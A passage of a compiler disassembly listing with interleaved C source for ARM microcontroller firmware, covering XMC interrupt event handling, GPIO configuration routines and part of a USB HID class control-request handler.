 80024e6:	4770      	bx	lr
 80024e8:	50004710 	.word	0x50004710

080024ec <XMC_SCU_INTERRUPT_SetEventHandler>:
/*
 * API to assign the event handler function to be executed on occurrence of the selected event.
 */
XMC_SCU_STATUS_t XMC_SCU_INTERRUPT_SetEventHandler(const XMC_SCU_INTERRUPT_EVENT_t event,
                                                   const XMC_SCU_INTERRUPT_EVENT_HANDLER_t handler)
{
 80024ec:	b480      	push	{r7}
 80024ee:	b085      	sub	sp, #20
 80024f0:	af00      	add	r7, sp, #0
 80024f2:	6078      	str	r0, [r7, #4]
 80024f4:	6039      	str	r1, [r7, #0]
  uint32_t index;
  XMC_SCU_STATUS_t status;
  
  index = 0U;
 80024f6:	2300      	movs	r3, #0
 80024f8:	60fb      	str	r3, [r7, #12]
  while (((event & ((XMC_SCU_INTERRUPT_EVENT_t)1 << index)) == 0U) && (index < XMC_SCU_INTERRUPT_EVENT_MAX))
 80024fa:	e002      	b.n	8002502 <XMC_SCU_INTERRUPT_SetEventHandler+0x16>
  {
    index++;
 80024fc:	68fb      	ldr	r3, [r7, #12]
 80024fe:	3301      	adds	r3, #1
 8002500:	60fb      	str	r3, [r7, #12]
  while (((event & ((XMC_SCU_INTERRUPT_EVENT_t)1 << index)) == 0U) && (index < XMC_SCU_INTERRUPT_EVENT_MAX))
 8002502:	687a      	ldr	r2, [r7, #4]
 8002504:	68fb      	ldr	r3, [r7, #12]
 8002506:	fa22 f303 	lsr.w	r3, r2, r3
 800250a:	f003 0301 	and.w	r3, r3, #1
 800250e:	2b00      	cmp	r3, #0
 8002510:	d102      	bne.n	8002518 <XMC_SCU_INTERRUPT_SetEventHandler+0x2c>
 8002512:	68fb      	ldr	r3, [r7, #12]
 8002514:	2b1f      	cmp	r3, #31
 8002516:	d9f1      	bls.n	80024fc <XMC_SCU_INTERRUPT_SetEventHandler+0x10>
  }
  
  if (index == XMC_SCU_INTERRUPT_EVENT_MAX)
 8002518:	68fb      	ldr	r3, [r7, #12]
 800251a:	2b20      	cmp	r3, #32
 800251c:	d102      	bne.n	8002524 <XMC_SCU_INTERRUPT_SetEventHandler+0x38>
  {
    status = XMC_SCU_STATUS_ERROR;
 800251e:	2301      	movs	r3, #1
 8002520:	72fb      	strb	r3, [r7, #11]
 8002522:	e006      	b.n	8002532 <XMC_SCU_INTERRUPT_SetEventHandler+0x46>
  }
  else
  {
    event_handler_list[index] = handler;
 8002524:	4906      	ldr	r1, [pc, #24]	; (8002540 <XMC_SCU_INTERRUPT_SetEventHandler+0x54>)
 8002526:	68fb      	ldr	r3, [r7, #12]
 8002528:	683a      	ldr	r2, [r7, #0]
 800252a:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    status = XMC_SCU_STATUS_OK;      
 800252e:	2300      	movs	r3, #0
 8002530:	72fb      	strb	r3, [r7, #11]
  }
  
  return (status);
 8002532:	7afb      	ldrb	r3, [r7, #11]
}
 8002534:	4618      	mov	r0, r3
 8002536:	3714      	adds	r7, #20
 8002538:	46bd      	mov	sp, r7
 800253a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800253e:	4770      	bx	lr
 8002540:	20000688 	.word	0x20000688

08002544 <XMC_SCU_IRQHandler>:

/*
 * API to execute callback functions for multiple events.
 */
void XMC_SCU_IRQHandler(uint32_t sr_num)
{
 8002544:	b580      	push	{r7, lr}
 8002546:	b086      	sub	sp, #24
 8002548:	af00      	add	r7, sp, #0
 800254a:	6078      	str	r0, [r7, #4]
  XMC_SCU_INTERRUPT_EVENT_t event;
  XMC_SCU_INTERRUPT_EVENT_HANDLER_t event_handler;
  
  XMC_UNUSED_ARG(sr_num);
  
  index = 0U;
 800254c:	2300      	movs	r3, #0
 800254e:	617b      	str	r3, [r7, #20]
  event = XMC_SCU_INTERUPT_GetEventStatus();
 8002550:	f7fe fc7e 	bl	8000e50 <XMC_SCU_INTERUPT_GetEventStatus>
 8002554:	6138      	str	r0, [r7, #16]
  while (index < XMC_SCU_INTERRUPT_EVENT_MAX)
 8002556:	e01c      	b.n	8002592 <XMC_SCU_IRQHandler+0x4e>
  {    
    if ((event & ((XMC_SCU_INTERRUPT_EVENT_t)1 << index)) != 0U)
 8002558:	693a      	ldr	r2, [r7, #16]
 800255a:	697b      	ldr	r3, [r7, #20]
 800255c:	fa22 f303 	lsr.w	r3, r2, r3
 8002560:	f003 0301 	and.w	r3, r3, #1
 8002564:	2b00      	cmp	r3, #0
 8002566:	d011      	beq.n	800258c <XMC_SCU_IRQHandler+0x48>
    {
      event_handler = event_handler_list[index];
 8002568:	4a0e      	ldr	r2, [pc, #56]	; (80025a4 <XMC_SCU_IRQHandler+0x60>)
 800256a:	697b      	ldr	r3, [r7, #20]
 800256c:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8002570:	60fb      	str	r3, [r7, #12]
      if (event_handler != NULL)
 8002572:	68fb      	ldr	r3, [r7, #12]
 8002574:	2b00      	cmp	r3, #0
 8002576:	d001      	beq.n	800257c <XMC_SCU_IRQHandler+0x38>
      {
          (event_handler)();
 8002578:	68fb      	ldr	r3, [r7, #12]
 800257a:	4798      	blx	r3
      }
      
      XMC_SCU_INTERRUPT_ClearEventStatus((uint32_t)(1UL << index));
 800257c:	2201      	movs	r2, #1
 800257e:	697b      	ldr	r3, [r7, #20]
 8002580:	fa02 f303 	lsl.w	r3, r2, r3
 8002584:	4618      	mov	r0, r3
 8002586:	f7fe fc6f 	bl	8000e68 <XMC_SCU_INTERRUPT_ClearEventStatus>
      
      break;
 800258a:	e006      	b.n	800259a <XMC_SCU_IRQHandler+0x56>
    }   
    index++;    
 800258c:	697b      	ldr	r3, [r7, #20]
 800258e:	3301      	adds	r3, #1
 8002590:	617b      	str	r3, [r7, #20]
  while (index < XMC_SCU_INTERRUPT_EVENT_MAX)
 8002592:	697b      	ldr	r3, [r7, #20]
 8002594:	2b1f      	cmp	r3, #31
 8002596:	d9df      	bls.n	8002558 <XMC_SCU_IRQHandler+0x14>
  }
}
 8002598:	bf00      	nop
 800259a:	bf00      	nop
 800259c:	3718      	adds	r7, #24
 800259e:	46bd      	mov	sp, r7
 80025a0:	bd80      	pop	{r7, pc}
 80025a2:	bf00      	nop
 80025a4:	20000688 	.word	0x20000688

080025a8 <XMC_GPIO_SetMode>:
/*******************************************************************************
 * API IMPLEMENTATION
 *******************************************************************************/

void XMC_GPIO_SetMode(XMC_GPIO_PORT_t *const port, const uint8_t pin, const XMC_GPIO_MODE_t mode)
{
 80025a8:	b480      	push	{r7}
 80025aa:	b083      	sub	sp, #12
 80025ac:	af00      	add	r7, sp, #0
 80025ae:	6078      	str	r0, [r7, #4]
 80025b0:	460b      	mov	r3, r1
 80025b2:	70fb      	strb	r3, [r7, #3]
 80025b4:	4613      	mov	r3, r2
 80025b6:	70bb      	strb	r3, [r7, #2]
  XMC_ASSERT("XMC_GPIO_SetMode: Invalid port", XMC_GPIO_CHECK_PORT(port));
  XMC_ASSERT("XMC_GPIO_SetMode: Invalid mode", XMC_GPIO_IsModeValid(mode));

  port->IOCR[(uint32_t)pin >> 2U] &= ~(uint32_t)((uint32_t)PORT_IOCR_PC_Msk << ((uint32_t)PORT_IOCR_PC_Size * ((uint32_t)pin & 0x3U)));
 80025b8:	78fb      	ldrb	r3, [r7, #3]
 80025ba:	089b      	lsrs	r3, r3, #2
 80025bc:	b2db      	uxtb	r3, r3
 80025be:	461a      	mov	r2, r3
 80025c0:	687b      	ldr	r3, [r7, #4]
 80025c2:	3204      	adds	r2, #4
 80025c4:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 80025c8:	78fb      	ldrb	r3, [r7, #3]
 80025ca:	f003 0303 	and.w	r3, r3, #3
 80025ce:	00db      	lsls	r3, r3, #3
 80025d0:	21f8      	movs	r1, #248	; 0xf8
 80025d2:	fa01 f303 	lsl.w	r3, r1, r3
 80025d6:	43db      	mvns	r3, r3
 80025d8:	78f9      	ldrb	r1, [r7, #3]
 80025da:	0889      	lsrs	r1, r1, #2
 80025dc:	b2c9      	uxtb	r1, r1
 80025de:	4608      	mov	r0, r1
 80025e0:	ea02 0103 	and.w	r1, r2, r3
 80025e4:	687b      	ldr	r3, [r7, #4]
 80025e6:	1d02      	adds	r2, r0, #4
 80025e8:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  port->IOCR[(uint32_t)pin >> 2U] |= (uint32_t)mode << ((uint32_t)PORT_IOCR_PC_Size * ((uint32_t)pin & 0x3U));
 80025ec:	78fb      	ldrb	r3, [r7, #3]
 80025ee:	089b      	lsrs	r3, r3, #2
 80025f0:	b2db      	uxtb	r3, r3
 80025f2:	461a      	mov	r2, r3
 80025f4:	687b      	ldr	r3, [r7, #4]
 80025f6:	3204      	adds	r2, #4
 80025f8:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 80025fc:	78b9      	ldrb	r1, [r7, #2]
 80025fe:	78fb      	ldrb	r3, [r7, #3]
 8002600:	f003 0303 	and.w	r3, r3, #3
 8002604:	00db      	lsls	r3, r3, #3
 8002606:	fa01 f303 	lsl.w	r3, r1, r3
 800260a:	78f9      	ldrb	r1, [r7, #3]
 800260c:	0889      	lsrs	r1, r1, #2
 800260e:	b2c9      	uxtb	r1, r1
 8002610:	4608      	mov	r0, r1
 8002612:	ea42 0103 	orr.w	r1, r2, r3
 8002616:	687b      	ldr	r3, [r7, #4]
 8002618:	1d02      	adds	r2, r0, #4
 800261a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
}
 800261e:	bf00      	nop
 8002620:	370c      	adds	r7, #12
 8002622:	46bd      	mov	sp, r7
 8002624:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002628:	4770      	bx	lr

0800262a <XMC_GPIO_SetHardwareControl>:

void XMC_GPIO_SetHardwareControl(XMC_GPIO_PORT_t *const port, const uint8_t pin, const XMC_GPIO_HWCTRL_t hwctrl)
{
 800262a:	b480      	push	{r7}
 800262c:	b083      	sub	sp, #12
 800262e:	af00      	add	r7, sp, #0
 8002630:	6078      	str	r0, [r7, #4]
 8002632:	460b      	mov	r3, r1
 8002634:	70fb      	strb	r3, [r7, #3]
 8002636:	4613      	mov	r3, r2
 8002638:	70bb      	strb	r3, [r7, #2]
  XMC_ASSERT("XMC_GPIO_SetHardwareControl: Invalid port", XMC_GPIO_CHECK_PORT(port));
  XMC_ASSERT("XMC_GPIO_SetHardwareControl: Invalid hwctrl", XMC_GPIO_CHECK_HWCTRL(hwctrl));

  port->HWSEL &= ~(uint32_t)((uint32_t)PORT_HWSEL_Msk << ((uint32_t)pin << 1U));
 800263a:	687b      	ldr	r3, [r7, #4]
 800263c:	6f5a      	ldr	r2, [r3, #116]	; 0x74
 800263e:	78fb      	ldrb	r3, [r7, #3]
 8002640:	005b      	lsls	r3, r3, #1
 8002642:	2103      	movs	r1, #3
 8002644:	fa01 f303 	lsl.w	r3, r1, r3
 8002648:	43db      	mvns	r3, r3
 800264a:	401a      	ands	r2, r3
 800264c:	687b      	ldr	r3, [r7, #4]
 800264e:	675a      	str	r2, [r3, #116]	; 0x74
  port->HWSEL |= (uint32_t)hwctrl << ((uint32_t)pin << 1U);
 8002650:	687b      	ldr	r3, [r7, #4]
 8002652:	6f5a      	ldr	r2, [r3, #116]	; 0x74
 8002654:	78b9      	ldrb	r1, [r7, #2]
 8002656:	78fb      	ldrb	r3, [r7, #3]
 8002658:	005b      	lsls	r3, r3, #1
 800265a:	fa01 f303 	lsl.w	r3, r1, r3
 800265e:	431a      	orrs	r2, r3
 8002660:	687b      	ldr	r3, [r7, #4]
 8002662:	675a      	str	r2, [r3, #116]	; 0x74
}
 8002664:	bf00      	nop
 8002666:	370c      	adds	r7, #12
 8002668:	46bd      	mov	sp, r7
 800266a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800266e:	4770      	bx	lr

08002670 <HID_Device_ProcessControlRequest>:
#define  __INCLUDE_FROM_HID_DRIVER
#define  __INCLUDE_FROM_HID_DEVICE_C
#include "HIDClassDevice.h"

void HID_Device_ProcessControlRequest(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
 8002670:	e92d 4ff0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, fp, lr}
 8002674:	b091      	sub	sp, #68	; 0x44
 8002676:	af02      	add	r7, sp, #8
 8002678:	60f8      	str	r0, [r7, #12]
	 *  \return Boolean \c true if the selected endpoint has received a SETUP packet, \c false otherwise.
	 */
	static inline bool Endpoint_IsSETUPReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
	static inline bool Endpoint_IsSETUPReceived(void)
	{
		return device.IsSetupRecieved;
 800267a:	4bb3      	ldr	r3, [pc, #716]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 800267c:	f893 313e 	ldrb.w	r3, [r3, #318]	; 0x13e
 8002680:	f3c3 0340 	ubfx	r3, r3, #1, #1
 8002684:	b2db      	uxtb	r3, r3
 8002686:	2b00      	cmp	r3, #0
 8002688:	bf14      	ite	ne
 800268a:	2301      	movne	r3, #1
 800268c:	2300      	moveq	r3, #0
 800268e:	b2db      	uxtb	r3, r3
	if (!(Endpoint_IsSETUPReceived()))
 8002690:	f083 0301 	eor.w	r3, r3, #1
 8002694:	b2db      	uxtb	r3, r3
 8002696:	2b00      	cmp	r3, #0
 8002698:	f040 81c8 	bne.w	8002a2c <HID_Device_ProcessControlRequest+0x3bc>
	  return;

	if (USB_ControlRequest.wIndex != HIDInterfaceInfo->Config.InterfaceNumber)
 800269c:	4bab      	ldr	r3, [pc, #684]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 800269e:	889b      	ldrh	r3, [r3, #4]
 80026a0:	b29a      	uxth	r2, r3
 80026a2:	68fb      	ldr	r3, [r7, #12]
 80026a4:	781b      	ldrb	r3, [r3, #0]
 80026a6:	b29b      	uxth	r3, r3
 80026a8:	429a      	cmp	r2, r3
 80026aa:	f040 81c1 	bne.w	8002a30 <HID_Device_ProcessControlRequest+0x3c0>
	  return;

	switch (USB_ControlRequest.bRequest)
 80026ae:	4ba7      	ldr	r3, [pc, #668]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 80026b0:	785b      	ldrb	r3, [r3, #1]
 80026b2:	3b01      	subs	r3, #1
 80026b4:	2b0a      	cmp	r3, #10
 80026b6:	f200 81c8 	bhi.w	8002a4a <HID_Device_ProcessControlRequest+0x3da>
 80026ba:	a201      	add	r2, pc, #4	; (adr r2, 80026c0 <HID_Device_ProcessControlRequest+0x50>)
 80026bc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80026c0:	080026ed 	.word	0x080026ed
 80026c4:	080029b3 	.word	0x080029b3
 80026c8:	080028d3 	.word	0x080028d3
 80026cc:	08002a4b 	.word	0x08002a4b
 80026d0:	08002a4b 	.word	0x08002a4b
 80026d4:	08002a4b 	.word	0x08002a4b
 80026d8:	08002a4b 	.word	0x08002a4b
 80026dc:	08002a4b 	.word	0x08002a4b
 80026e0:	080027f1 	.word	0x080027f1
 80026e4:	08002983 	.word	0x08002983
 80026e8:	08002951 	.word	0x08002951
	{
		case HID_REQ_GetReport:
			if (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))
 80026ec:	4b97      	ldr	r3, [pc, #604]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 80026ee:	781b      	ldrb	r3, [r3, #0]
 80026f0:	2ba1      	cmp	r3, #161	; 0xa1
 80026f2:	f040 819f 	bne.w	8002a34 <HID_Device_ProcessControlRequest+0x3c4>
			{
 80026f6:	466b      	mov	r3, sp
 80026f8:	461c      	mov	r4, r3
				uint16_t ReportSize = 0;
 80026fa:	2300      	movs	r3, #0
 80026fc:	82fb      	strh	r3, [r7, #22]
				uint8_t  ReportID   = (USB_ControlRequest.wValue & 0xFF);
 80026fe:	4b93      	ldr	r3, [pc, #588]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 8002700:	885b      	ldrh	r3, [r3, #2]
 8002702:	b29b      	uxth	r3, r3
 8002704:	b2db      	uxtb	r3, r3
 8002706:	757b      	strb	r3, [r7, #21]
				uint8_t  ReportType = (USB_ControlRequest.wValue >> 8) - 1;
 8002708:	4b90      	ldr	r3, [pc, #576]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 800270a:	885b      	ldrh	r3, [r3, #2]
 800270c:	b29b      	uxth	r3, r3
 800270e:	0a1b      	lsrs	r3, r3, #8
 8002710:	b29b      	uxth	r3, r3
 8002712:	b2db      	uxtb	r3, r3
 8002714:	3b01      	subs	r3, #1
 8002716:	f887 302b 	strb.w	r3, [r7, #43]	; 0x2b
				uint8_t  ReportData[HIDInterfaceInfo->Config.PrevReportINBufferSize];
 800271a:	68fb      	ldr	r3, [r7, #12]
 800271c:	7b19      	ldrb	r1, [r3, #12]
 800271e:	460b      	mov	r3, r1
 8002720:	3b01      	subs	r3, #1
 8002722:	627b      	str	r3, [r7, #36]	; 0x24
 8002724:	b2cb      	uxtb	r3, r1
 8002726:	2200      	movs	r2, #0
 8002728:	603b      	str	r3, [r7, #0]
 800272a:	607a      	str	r2, [r7, #4]
 800272c:	f04f 0200 	mov.w	r2, #0
 8002730:	f04f 0300 	mov.w	r3, #0
 8002734:	e9d7 5600 	ldrd	r5, r6, [r7]
 8002738:	4630      	mov	r0, r6
 800273a:	00c3      	lsls	r3, r0, #3
 800273c:	4628      	mov	r0, r5
 800273e:	ea43 7350 	orr.w	r3, r3, r0, lsr #29
 8002742:	4628      	mov	r0, r5
 8002744:	00c2      	lsls	r2, r0, #3
 8002746:	b2cb      	uxtb	r3, r1
 8002748:	2200      	movs	r2, #0
 800274a:	469a      	mov	sl, r3
 800274c:	4693      	mov	fp, r2
 800274e:	f04f 0200 	mov.w	r2, #0
 8002752:	f04f 0300 	mov.w	r3, #0
 8002756:	ea4f 03cb 	mov.w	r3, fp, lsl #3
 800275a:	ea43 735a 	orr.w	r3, r3, sl, lsr #29
 800275e:	ea4f 02ca 	mov.w	r2, sl, lsl #3
 8002762:	460b      	mov	r3, r1
 8002764:	3307      	adds	r3, #7
 8002766:	08db      	lsrs	r3, r3, #3
 8002768:	00db      	lsls	r3, r3, #3
 800276a:	ebad 0d03 	sub.w	sp, sp, r3
 800276e:	ab02      	add	r3, sp, #8
 8002770:	3300      	adds	r3, #0
 8002772:	623b      	str	r3, [r7, #32]

				memset(ReportData, 0, sizeof(ReportData));
 8002774:	460b      	mov	r3, r1
 8002776:	461a      	mov	r2, r3
 8002778:	2100      	movs	r1, #0
 800277a:	6a38      	ldr	r0, [r7, #32]
 800277c:	f004 f872 	bl	8006864 <memset>

				CALLBACK_HID_Device_CreateHIDReport(HIDInterfaceInfo, &ReportID, ReportType, ReportData, &ReportSize);
 8002780:	f897 202b 	ldrb.w	r2, [r7, #43]	; 0x2b
 8002784:	f107 0115 	add.w	r1, r7, #21
 8002788:	f107 0316 	add.w	r3, r7, #22
 800278c:	9300      	str	r3, [sp, #0]
 800278e:	6a3b      	ldr	r3, [r7, #32]
 8002790:	68f8      	ldr	r0, [r7, #12]
 8002792:	f7fd ff4d 	bl	8000630 <CALLBACK_HID_Device_CreateHIDReport>

				if (HIDInterfaceInfo->Config.PrevReportINBuffer != NULL)
 8002796:	68fb      	ldr	r3, [r7, #12]
 8002798:	689b      	ldr	r3, [r3, #8]
 800279a:	2b00      	cmp	r3, #0
 800279c:	d007      	beq.n	80027ae <HID_Device_ProcessControlRequest+0x13e>
				{
					MEMCPY(HIDInterfaceInfo->Config.PrevReportINBuffer, ReportData,
 800279e:	68fb      	ldr	r3, [r7, #12]
 80027a0:	6898      	ldr	r0, [r3, #8]
 80027a2:	68fb      	ldr	r3, [r7, #12]
 80027a4:	7b1b      	ldrb	r3, [r3, #12]
 80027a6:	461a      	mov	r2, r3
 80027a8:	6a39      	ldr	r1, [r7, #32]
 80027aa:	f000 fa5d 	bl	8002c68 <thumb2_memcpy>
		device.CurrentEndpoint = Address & ENDPOINT_EPNUM_MASK;
 80027ae:	2200      	movs	r2, #0
 80027b0:	4b65      	ldr	r3, [pc, #404]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 80027b2:	f883 213c 	strb.w	r2, [r3, #316]	; 0x13c
		device.CurrentDirection = (Address & ENDPOINT_DIR_MASK);
 80027b6:	2200      	movs	r2, #0
 80027b8:	4b63      	ldr	r3, [pc, #396]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 80027ba:	f883 213d 	strb.w	r2, [r3, #317]	; 0x13d
	}
 80027be:	bf00      	nop
	 *  \note This is not applicable for non CONTROL type endpoints.
	 */
	static inline void Endpoint_ClearSETUP(void) ATTR_ALWAYS_INLINE;
	static inline void Endpoint_ClearSETUP(void)
	{
		device.IsSetupRecieved = 0;
 80027c0:	4a61      	ldr	r2, [pc, #388]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 80027c2:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 80027c6:	f36f 0341 	bfc	r3, #1, #1
 80027ca:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	}
 80027ce:	bf00      	nop

				Endpoint_SelectEndpoint(ENDPOINT_CONTROLEP);

				Endpoint_ClearSETUP();

				if (ReportID)
 80027d0:	7d7b      	ldrb	r3, [r7, #21]
 80027d2:	2b00      	cmp	r3, #0
 80027d4:	d003      	beq.n	80027de <HID_Device_ProcessControlRequest+0x16e>
				  Endpoint_Write_8(ReportID);
 80027d6:	7d7b      	ldrb	r3, [r7, #21]
 80027d8:	4618      	mov	r0, r3
 80027da:	f000 fc2f 	bl	800303c <Endpoint_Write_8>

				Endpoint_Write_Control_Stream_LE(ReportData, ReportSize);
 80027de:	8afb      	ldrh	r3, [r7, #22]
 80027e0:	4619      	mov	r1, r3
 80027e2:	6a38      	ldr	r0, [r7, #32]
 80027e4:	f000 ffc0 	bl	8003768 <Endpoint_Write_Control_Stream_LE>
				Endpoint_ClearOUT();
 80027e8:	f000 fb32 	bl	8002e50 <Endpoint_ClearOUT>
 80027ec:	46a5      	mov	sp, r4
			}

			break;
 80027ee:	e121      	b.n	8002a34 <HID_Device_ProcessControlRequest+0x3c4>
		case HID_REQ_SetReport:
			if (USB_ControlRequest.bmRequestType == (REQDIR_HOSTTODEVICE | REQTYPE_CLASS | REQREC_INTERFACE))
 80027f0:	4b56      	ldr	r3, [pc, #344]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 80027f2:	781b      	ldrb	r3, [r3, #0]
 80027f4:	2b21      	cmp	r3, #33	; 0x21
 80027f6:	f040 811f 	bne.w	8002a38 <HID_Device_ProcessControlRequest+0x3c8>
			{
 80027fa:	466b      	mov	r3, sp
 80027fc:	461e      	mov	r6, r3
				uint16_t ReportSize = USB_ControlRequest.wLength;
 80027fe:	4b53      	ldr	r3, [pc, #332]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 8002800:	799a      	ldrb	r2, [r3, #6]
 8002802:	79db      	ldrb	r3, [r3, #7]
 8002804:	021b      	lsls	r3, r3, #8
 8002806:	4313      	orrs	r3, r2
 8002808:	86fb      	strh	r3, [r7, #54]	; 0x36
				uint8_t  ReportID   = (USB_ControlRequest.wValue & 0xFF);
 800280a:	4b50      	ldr	r3, [pc, #320]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 800280c:	885b      	ldrh	r3, [r3, #2]
 800280e:	b29b      	uxth	r3, r3
 8002810:	f887 3035 	strb.w	r3, [r7, #53]	; 0x35
				uint8_t  ReportType = (USB_ControlRequest.wValue >> 8) - 1;
 8002814:	4b4d      	ldr	r3, [pc, #308]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 8002816:	885b      	ldrh	r3, [r3, #2]
 8002818:	b29b      	uxth	r3, r3
 800281a:	0a1b      	lsrs	r3, r3, #8
 800281c:	b29b      	uxth	r3, r3
 800281e:	b2db      	uxtb	r3, r3
 8002820:	3b01      	subs	r3, #1
 8002822:	f887 3034 	strb.w	r3, [r7, #52]	; 0x34
				uint8_t  ReportData[ReportSize];
 8002826:	8ef9      	ldrh	r1, [r7, #54]	; 0x36
 8002828:	460b      	mov	r3, r1
 800282a:	3b01      	subs	r3, #1
 800282c:	633b      	str	r3, [r7, #48]	; 0x30
 800282e:	b28b      	uxth	r3, r1
 8002830:	2200      	movs	r2, #0
 8002832:	4698      	mov	r8, r3
 8002834:	4691      	mov	r9, r2
 8002836:	f04f 0200 	mov.w	r2, #0
 800283a:	f04f 0300 	mov.w	r3, #0
 800283e:	ea4f 03c9 	mov.w	r3, r9, lsl #3
 8002842:	ea43 7358 	orr.w	r3, r3, r8, lsr #29
 8002846:	ea4f 02c8 	mov.w	r2, r8, lsl #3
 800284a:	b28b      	uxth	r3, r1
 800284c:	2200      	movs	r2, #0
 800284e:	461c      	mov	r4, r3
 8002850:	4615      	mov	r5, r2
 8002852:	f04f 0200 	mov.w	r2, #0
 8002856:	f04f 0300 	mov.w	r3, #0
 800285a:	00eb      	lsls	r3, r5, #3
 800285c:	ea43 7354 	orr.w	r3, r3, r4, lsr #29
 8002860:	00e2      	lsls	r2, r4, #3
 8002862:	460b      	mov	r3, r1
 8002864:	3307      	adds	r3, #7
 8002866:	08db      	lsrs	r3, r3, #3
 8002868:	00db      	lsls	r3, r3, #3
 800286a:	ebad 0d03 	sub.w	sp, sp, r3
 800286e:	ab02      	add	r3, sp, #8
 8002870:	3300      	adds	r3, #0
 8002872:	62fb      	str	r3, [r7, #44]	; 0x2c
		device.IsSetupRecieved = 0;
 8002874:	4a34      	ldr	r2, [pc, #208]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 8002876:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 800287a:	f36f 0341 	bfc	r3, #1, #1
 800287e:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	}
 8002882:	bf00      	nop

				Endpoint_ClearSETUP();
				Endpoint_Read_Control_Stream_LE(ReportData, ReportSize);
 8002884:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 8002886:	4619      	mov	r1, r3
 8002888:	6af8      	ldr	r0, [r7, #44]	; 0x2c
 800288a:	f000 ffb5 	bl	80037f8 <Endpoint_Read_Control_Stream_LE>
				Endpoint_ClearIN();
 800288e:	f000 fb2b 	bl	8002ee8 <Endpoint_ClearIN>

				CALLBACK_HID_Device_ProcessHIDReport(HIDInterfaceInfo, ReportID, ReportType,
				                                     &ReportData[ReportID ? 1 : 0], ReportSize - (ReportID ? 1 : 0));
 8002892:	f897 3035 	ldrb.w	r3, [r7, #53]	; 0x35
 8002896:	2b00      	cmp	r3, #0
 8002898:	bf14      	ite	ne
 800289a:	2301      	movne	r3, #1
 800289c:	2300      	moveq	r3, #0
 800289e:	b2db      	uxtb	r3, r3
 80028a0:	461a      	mov	r2, r3
 80028a2:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80028a4:	1898      	adds	r0, r3, r2
 80028a6:	f897 3035 	ldrb.w	r3, [r7, #53]	; 0x35
 80028aa:	2b00      	cmp	r3, #0
 80028ac:	bf14      	ite	ne
 80028ae:	2301      	movne	r3, #1
 80028b0:	2300      	moveq	r3, #0
 80028b2:	b2db      	uxtb	r3, r3
 80028b4:	b29b      	uxth	r3, r3
				CALLBACK_HID_Device_ProcessHIDReport(HIDInterfaceInfo, ReportID, ReportType,
 80028b6:	8efa      	ldrh	r2, [r7, #54]	; 0x36
 80028b8:	1ad3      	subs	r3, r2, r3
 80028ba:	b29b      	uxth	r3, r3
 80028bc:	f897 2034 	ldrb.w	r2, [r7, #52]	; 0x34
 80028c0:	f897 1035 	ldrb.w	r1, [r7, #53]	; 0x35
 80028c4:	9300      	str	r3, [sp, #0]
 80028c6:	4603      	mov	r3, r0
 80028c8:	68f8      	ldr	r0, [r7, #12]
 80028ca:	f7fd ffc9 	bl	8000860 <CALLBACK_HID_Device_ProcessHIDReport>
 80028ce:	46b5      	mov	sp, r6
			}

			break;
 80028d0:	e0b2      	b.n	8002a38 <HID_Device_ProcessControlRequest+0x3c8>
		case HID_REQ_GetProtocol:
			if (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))
 80028d2:	4b1e      	ldr	r3, [pc, #120]	; (800294c <HID_Device_ProcessControlRequest+0x2dc>)
 80028d4:	781b      	ldrb	r3, [r3, #0]
 80028d6:	2ba1      	cmp	r3, #161	; 0xa1
 80028d8:	f040 80b0 	bne.w	8002a3c <HID_Device_ProcessControlRequest+0x3cc>
		device.IsSetupRecieved = 0;
 80028dc:	4a1a      	ldr	r2, [pc, #104]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 80028de:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 80028e2:	f36f 0341 	bfc	r3, #1, #1
 80028e6:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	}
 80028ea:	bf00      	nop
			{
				Endpoint_ClearSETUP();
				while (!(Endpoint_IsINReady()));
 80028ec:	bf00      	nop
	 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
	 */
	static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
	static inline bool Endpoint_IsINReady(void)
	{
		USBD_Endpoint_t *ep = &device.Endpoints[device.CurrentEndpoint];
 80028ee:	4b16      	ldr	r3, [pc, #88]	; (8002948 <HID_Device_ProcessControlRequest+0x2d8>)
 80028f0:	f893 313c 	ldrb.w	r3, [r3, #316]	; 0x13c
 80028f4:	461a      	mov	r2, r3
 80028f6:	232c      	movs	r3, #44	; 0x2c
 80028f8:	fb02 f303 	mul.w	r3, r2, r3
